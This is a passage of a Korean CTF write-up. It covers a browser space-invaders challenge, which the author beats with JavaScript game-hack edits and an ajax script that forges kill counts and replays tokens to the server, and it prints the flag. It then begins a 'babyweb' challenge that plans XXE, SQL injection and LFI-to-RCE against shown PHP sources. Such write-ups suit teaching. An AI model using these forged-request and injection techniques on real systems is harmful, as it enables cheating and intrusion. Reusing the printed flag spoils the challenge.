<span class="nv">Cache</span><span class="o">-</span><span class="nv">Control</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">store</span><span class="p">,</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span><span class="p">,</span> <span class="ss">must</span><span class="o">-</span><span class="ss">revalidate</span>
<span class="nv">Pragma</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span>
<span class="nv">Vary</span><span class="o">:</span> <span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">161</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">text</span><span class="o">/</span><span class="ss">html</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>

<span class="ss">alert</span><span class="p">(</span><span class="ss">'비정상 행위 탐지!! 토큰값이 일치하지 않습니다. 비정상 행위로 점수가 합쳐지지 않습니다. 새로고침 해주십시오'</span><span class="p">);</span>
</code></pre></div></div>

<p>[Token 조작 패킷 - Response]</p>

<p>조작된 토큰값 행위는 위와 같이 탐지되어 더이상 Kill수가 쌓이지 않는다.</p>

<h3 id="2-hint--debug-정보-찾기">2<strong>. Hint &amp; Debug 정보 찾기</strong>
</h3>

<ul>
  <li>이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.</li>
</ul>

<p><img src="/assets/bob/bob920.png" alt="/assets/bob/bob920.png"></p>

<ul>
  <li>Chrome Console을 확인해보면 위와 같이 소수점 값을 확인할 수 있다. (출력된 값의 개수는 사용자마다 다를 수 있음.) 해당 값에 대한 정보를 파악하기 위해 “<strong>bob_game.js</strong>” 파일의 492번째 줄 코드를 확인해보도록 하자.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">initGameStart</span><span class="p">()</span> <span class="p">{</span>
            <span class="nx">screen</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="mi">1300</span><span class="p">;</span>
            <span class="nx">screen</span><span class="p">.</span><span class="nx">canvas</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="mi">900</span><span class="p">;</span>
            <span class="nx">gameSize</span> <span class="o">=</span> <span class="p">{</span>
              <span class="na">width</span><span class="p">:</span> <span class="mi">1300</span><span class="p">,</span>
              <span class="na">height</span><span class="p">:</span> <span class="mi">900</span>
            <span class="p">};</span>
            
            <span class="nx">invaderMultiplier</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
            <span class="nx">initialOffsetInvader</span> <span class="o">=</span> <span class="mi">420</span><span class="p">;</span>

          <span class="nx">invaderAttackRate</span> <span class="o">=</span> <span class="mf">0.98</span> <span class="o">+</span> <span class="dl">""</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="mi">10</span><span class="p">);</span>
          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">invaderAttackRate</span><span class="p">);</span>
          <span class="nx">invaderSpeed</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span>
          <span class="nx">spawnDelayCounter</span> <span class="o">=</span> <span class="nx">invaderSpawnDelay</span><span class="p">;</span>
          
          <span class="nx">game</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Game</span><span class="p">();</span>
        <span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>492번째 코드는 “<strong>console.log(invaderAttackRate);</strong>” 이며 해당 값은 변수명에서 알 수 있듯, 게임 공격자(외계인)의 공격 속도이며, 해당 값을 조작하여 어떤 반응이 보이는지 확인해 보자.</li>
</ul>

<p><img src="/assets/bob/Not_Attack.gif" alt="/assets/bob/Not_Attack.gif"></p>

<ul>
  <li>“<strong>invaderAttackRate = 9999;</strong>” 방식으로 공격자(외계인)이 공격을 하지 않는 행위로 로직을 구현할 수 있으며 아래와 같이 반대로 값을 낮춘다면 공격자는 더 빠르고 많이 공격을 하게 된다.</li>
</ul>

<p><img src="/assets/bob/Attack.gif" alt="/assets/bob/Attack.gif"></p>

<ul>
  <li>“<strong>invaderAttackRate = 0.001;” 이건 답이 없다….</strong>
</li>
</ul>

<p>위와 같이 힌트를 통하여 Javasciprt Debug를 통하여 로직을 변경할 수 있는 걸 확인할 수 있다. 하지만 공격 속도로 변경하는 것 보단 “<strong>스피드</strong>” + “<strong>무적</strong>” + “<strong>공격수 무한</strong>“를 걸어 문제 풀거나 자바스크립트 로직을 통하여 게임을 진행하지 않고 풀이를 진행할 수 있다.</p>

<h3 id="3-스피드--무적--공격-속도-핵-만들기">3<strong>. 스피드 + 무적 + 공격 속도 핵 만들기</strong>
</h3>

<ul>
  <li>이제 로직에 대해 파악하였으니, 문제 풀이를 위한 힌트 정보를 찾아보도록 하자.</li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">var</span> <span class="nv">Player</span> <span class="o">=</span> <span class="ss">function</span><span class="p">()</span> <span class="p">{</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">size</span> <span class="o">=</span> <span class="p">{</span>
            <span class="ss">width</span><span class="o">:</span> <span class="mf">0.1</span><span class="p">,</span>  <span class="o">//</span><span class="m">232</span><span class="err">번째</span> <span class="m">16</span> <span class="o">-&gt;</span> <span class="mf">0.1</span> <span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">게임</span> <span class="err">플레이어</span> <span class="err">안보이게</span> <span class="err">설정</span><span class="p">)</span>
            <span class="ss">height</span><span class="o">:</span> <span class="mf">0.1</span>  <span class="o">//</span><span class="m">233</span><span class="err">번째</span> <span class="m">8</span>  <span class="o">-&gt;</span> <span class="mf">0.1</span> <span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">게임</span> <span class="err">플레이어</span> <span class="err">안보이게</span> <span class="err">설정</span><span class="p">)</span>
          <span class="p">};</span>

<span class="o">//</span> <span class="m">259</span><span class="err">번째</span> <span class="err">라인</span>
<span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">LEFT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">-=</span> <span class="m">30</span><span class="p">;</span> <span class="o">//</span> <span class="m">2</span> <span class="o">-&gt;</span> <span class="m">30</span><span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">스피드</span> <span class="err">핵</span><span class="p">)</span>

<span class="o">//</span> <span class="m">260</span><span class="err">번째</span> <span class="err">라인</span>
<span class="ss">else</span> <span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">RIGHT</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">&lt;</span> <span class="ss">gameSize</span><span class="p">.</span><span class="ss">width</span> <span class="o">-</span> <span class="ss">this</span><span class="p">.</span><span class="ss">size</span><span class="p">.</span><span class="ss">width</span><span class="p">)</span> <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span><span class="p">.</span><span class="ss">x</span> <span class="o">+=</span> <span class="m">30</span><span class="p">;</span> <span class="o">//</span> <span class="m">2</span> <span class="o">-&gt;</span> <span class="m">30</span><span class="err">으로</span> <span class="err">수정</span> <span class="p">(</span><span class="err">스피드</span> <span class="err">핵</span><span class="p">)</span>

<span class="ss">if</span> <span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="ss">isDown</span><span class="p">(</span><span class="ss">this</span><span class="p">.</span><span class="ss">keyboarder</span><span class="p">.</span><span class="nv">KEYS</span><span class="p">.</span><span class="nv">Space</span><span class="p">))</span> <span class="p">{</span>
            <span class="o">//</span> <span class="m">263</span><span class="err">번째</span>  <span class="ss">this</span><span class="p">.</span><span class="ss">shooterHeat</span> <span class="o">+=</span> <span class="m">1</span><span class="p">;</span> <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">공격</span> <span class="err">속도</span> <span class="err">무제한</span><span class="p">)</span>

<span class="ss">destroy</span><span class="o">:</span> <span class="ss">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="o">//</span><span class="m">291</span><span class="err">번째</span> <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">false</span><span class="p">;</span>  <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">무적</span><span class="p">)</span>
            <span class="o">//</span><span class="m">292</span><span class="err">번째</span> <span class="ss">game</span><span class="p">.</span><span class="ss">lost</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>     <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">무적</span> <span class="o">-</span> <span class="err">게임</span> <span class="err">종료</span> <span class="err">안되게</span><span class="p">)</span>
          <span class="p">}</span>

<span class="ss">var</span> <span class="nv">Projectile</span> <span class="o">=</span> <span class="ss">function</span><span class="p">(</span><span class="ss">coordinates</span><span class="p">,</span> <span class="ss">velocity</span><span class="p">)</span> <span class="p">{</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">active</span> <span class="o">=</span> <span class="ss">true</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">coordinates</span> <span class="o">=</span> <span class="ss">coordinates</span><span class="p">;</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">size</span> <span class="o">=</span> <span class="p">{</span>
            <span class="ss">width</span><span class="o">:</span> <span class="m">300</span><span class="p">,</span> <span class="o">//</span><span class="m">303</span><span class="err">번째</span> <span class="err">줄</span>  <span class="m">3</span> <span class="o">-&gt;</span> <span class="m">300</span><span class="err">으로</span> <span class="err">변경</span> <span class="err">수정</span> <span class="p">(</span><span class="err">플레이어</span> <span class="err">공격</span> <span class="err">크기</span> <span class="err">변경</span><span class="p">)</span>
            <span class="ss">height</span><span class="o">:</span> <span class="m">3</span>
          <span class="p">};</span>
          <span class="ss">this</span><span class="p">.</span><span class="ss">velocity</span> <span class="o">=</span> <span class="ss">velocity</span><span class="p">;</span>
        <span class="p">};</span>

<span class="o">//</span><span class="m">491</span><span class="err">번째</span> <span class="ss">invaderAttackRate</span> <span class="o">=</span> <span class="mf">0.98</span> <span class="o">+</span> <span class="s2">""</span> <span class="o">+</span> <span class="nv">Math</span><span class="p">.</span><span class="ss">floor</span><span class="p">(</span><span class="nv">Math</span><span class="p">.</span><span class="ss">random</span><span class="p">()</span> <span class="o">*</span> <span class="m">10</span><span class="p">);</span> <span class="err">주석</span> <span class="err">처리</span> <span class="p">(</span><span class="err">공격자</span> <span class="err">외계인이</span> <span class="err">공격</span> <span class="err">못하도록</span> <span class="err">수정</span><span class="p">)</span>

</code></pre></div></div>

<ul>
  <li>위와 같이 Javascript를 변경하여 플레이를 할 경우 아래와 같이 실행된다.</li>
</ul>

<p><img src="/assets/bob/clear.gif" alt="/assets/bob/clear.gif"></p>

<ul>
  <li>게임핵 완성하여 플래그 획득!</li>
  <li>물론 위 와 같이 Javascript 게임 핵을 만들어 플레이하여 플래그를 획득할 수 있지만, 게임 로직을 파악하여 Javascript를 코딩할 수 있다면 플레이 대신 반복문으로 아래와 같이 플래그를 획득할 수 있다.</li>
</ul>

<h3 id="4-javascript-coding를-통하여-플래그-획득하기">4<strong>. Javascript Coding를 통하여 플래그 획득하기</strong>
</h3>

<ul>
  <li>이번에는 게임 핵으로 문제풀이 대신 Javascript 코딩을 통하여 플래그를 획득 하자.</li>
</ul>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">.</span><span class="nx">ajaxSetup</span><span class="p">({</span><span class="na">async</span><span class="p">:</span> <span class="kc">false</span><span class="p">});</span>  

<span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">check.php</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">kills</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="na">token</span><span class="p">:</span> <span class="dl">"</span><span class="s2">start</span><span class="dl">"</span><span class="p">};</span>
<span class="nx">token</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">token</span> <span class="o">=</span> <span class="nx">response</span><span class="p">;</span>
    
<span class="p">});</span>

<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="nx">i</span> <span class="o">&lt;=</span> <span class="mi">35</span><span class="p">;</span>  <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">kills</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span> <span class="na">token</span><span class="p">:</span> <span class="nx">token</span><span class="p">};</span>

    
    <span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">token</span> <span class="o">=</span> <span class="nx">response</span><span class="p">;</span>
    <span class="p">});</span>
<span class="p">};</span>

<span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">check</span><span class="p">:</span> <span class="dl">"</span><span class="s2">clear</span><span class="dl">"</span><span class="p">};</span>
<span class="nx">$</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">eval</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<ul>
  <li>Game 로직을 파악했다면 위와 같이 Javascript Code의 Ajax를 통하여 문제를 풀 수 있다.
로직의 원리는 Kills수가 15를 초과할 수 없으므로, 먼저 Token값에 “<strong>start</strong>“를 보내어 두 번째 이후부터 응답되어 온 토큰을 가지고 다시 35번 반복을 통하여 토큰을 전송하고, 마지막으로 공격자(외계인)를 전부 물리쳤다는 “<strong>check=clear</strong>” 값을 전송하여 플래그를 획득하는 로직이다.</li>
</ul>

<p><img src="/assets/bob/clears.gif" alt="/assets/bob/clears.gif"></p>

<ul class="task-list">
  <li class="task-list-item">
    <p><input type="checkbox" class="task-list-item-checkbox" disabled checked>Flag is bob{b0b_!s_fun_g@me_r3tr0}</p>
  </li>
  <li class="task-list-item">
    <p>대회 끝나고 Access.log를 확인해본 결과… “<strong>105961</strong>” Line이 쌓였네요. 3일 만에 10만 줄이 쌓인 걸 보니 오기로 게임 플레이어 하여 플래그를 획득한 분도 계실 거라 예상됩니다… (존경스럽습니다…)</p>
  </li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="babyweb">
<a class="anchor" href="#babyweb" aria-hidden="true"><span class="octicon octicon-link"></span></a>babyweb</h2>

<hr>

<p><img src="/assets/bob/bob921.png" alt="/assets/bob/bob921.png"></p>

<p>문제 설명에 /readFlag 라고 되어 있으므로 RCE를 해야하는 문제이다.</p>

<p>문제 페이지에 접속하면 XML 사용하는 페이지가 나온다.</p>

<p><img src="/assets/bob/bob922.png" alt="/assets/bob/bob922.png"></p>

<p>XXE 공격을 통해 소스 페이지를 하나하나씩 본다.</p>

<p>먼저 “join.php”를 보면 htmlentities를 통해 무언가를 막으려하는 것을 볼 수 있다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s2">"UTF-8"</span><span class="p">));</span>
	<span class="nv">$pw</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]);</span>
	<span class="nv">$nick</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'nick'</span><span class="p">],</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s2">"UTF-8"</span><span class="p">));</span>

	<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"INSERT INTO users VALUES (NULL,'</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">', '</span><span class="si">{</span><span class="nv">$pw</span><span class="si">}</span><span class="s2">', '</span><span class="si">{</span><span class="nv">$nick</span><span class="si">}</span><span class="s2">', '');"</span><span class="p">;</span>

	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;location.href="./";&lt;/script&gt;'</span><span class="p">;</span>
	<span class="k">else</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Error"); history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>

</code></pre></div></div>

<p>그리고 login.php를 보면 $_SESSION 변수에 로그인한 아이디와 닉네임을 넣는다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$id</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]);</span>
	<span class="nv">$pw</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]);</span>

	<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE userid='</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">' AND password='</span><span class="si">{</span><span class="nv">$pw</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>

	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$dbc</span><span class="p">,</span> <span class="nv">$query</span><span class="p">);</span>
	<span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="nv">$id</span><span class="o">===</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$pw</span><span class="o">===</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]){</span>

		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'nickname'</span><span class="p">];</span>
		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'userid'</span><span class="p">];</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;location.href="./";&lt;/script&gt;'</span><span class="p">;</span>
	<span class="p">}</span><span class="k">else</span>
		<span class="k">echo</span> <span class="s1">'&lt;script&gt;alert("Error"); history.go(-1);&lt;/script&gt;'</span><span class="p">;</span>

</code></pre></div></div>

<p>RCE를 위해서는 LFI 취약점이 필요하다. LFI를 하기 위해선 파일 업로드 기능을 이용하거나 파일에 원하는 것을 쓸 수 있는 기능이 있으면 된다.</p>

<p>하지만 “join.php”에서 htmlentities를 이용해 세션 파일에 php 태그를 사용할 수 없도록 제한하였다.</p>

<p>그 다음 “getxmldata.php”를 보면 mysqli_real_escape_string를 통해서 SQLI를 막은 것 처럼 보이지만 실제로는 막히지 않았다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">xss_filter</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> 
<span class="p">{</span> 
    <span class="k">if</span><span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> 
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
         
    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> 
    <span class="p">{</span> 
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> 
        <span class="p">{</span> 
            <span class="nv">$data</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">xss_filter</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> 
        <span class="p">}</span> 
         
        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span> 
    <span class="p">}</span> 
     
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'&amp;amp;'</span><span class="p">,</span><span class="s1">'&amp;lt;'</span><span class="p">,</span><span class="s1">'&amp;gt;'</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">'&amp;amp;amp;'</span><span class="p">,</span><span class="s1">'&amp;amp;lt;'</span><span class="p">,</span><span class="s1">'&amp;amp;gt;'</span><span class="p">),</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(&amp;#*\\w+)[\\x00-\\x20]+;/'</span><span class="p">,</span> <span class="s1">'$1;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(&amp;#x*[0-9A-F]+);*/i'</span><span class="p">,</span> <span class="s1">'$1;'</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span> 

    <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">"html_entity_decode"</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">html_entity_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="nv">$trans_tbl</span> <span class="o">=</span> <span class="nb">get_html_translation_table</span><span class="p">(</span><span class="nx">HTML_ENTITIES</span><span class="p">);</span>
        <span class="nv">$trans_tbl</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$trans_tbl</span><span class="p">);</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">strtr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$trans_tbl</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#(&lt;[^&gt;]+?[\\x00-\\x20"\\'</span><span class="p">])(</span><span class="o">?:</span><span class="nx">on</span><span class="o">|</span><span class="nx">xmlns</span><span class="p">)[</span><span class="o">^&gt;</span><span class="p">]</span><span class="o">*+&gt;</span><span class="c1">#i', '$1&gt;', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#([a-z]*)[\\x00-\\x20]*=[\\x00-\\x20]*([`\\'</span><span class="s2">"]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*j[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*a[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*v[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*a[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*s[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*c[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*r[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*i[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*p[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*t[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*:#i', '$1=$2nojavascript...', </span><span class="nv">$data</span><span class="s2">); 
    </span><span class="nv">$data</span><span class="s2"> = preg_replace('#([a-z]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*=([</span><span class="se">\\</span><span class="s2">'"</span><span class="p">]</span><span class="o">*</span><span class="p">)[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">v</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">b</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">s</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">c</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">r</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">i</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">p</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*</span><span class="nx">t</span><span class="p">[</span><span class="err">\</span><span class="nx">\x00</span><span class="o">-</span><span class="err">\</span><span class="nx">\x20</span><span class="p">]</span><span class="o">*:</span><span class="c1">#i', '$1=$2novbscript...', $data); </span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'#([a-z]*)[\\x00-\\x20]*=([\\'</span><span class="s2">"]*)[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*-moz-binding[</span><span class="se">\\</span><span class="s2">x00-</span><span class="se">\\</span><span class="s2">x20]*:#', '$1=$2nomozbinding...', </span><span class="nv">$data</span><span class="s2">); 
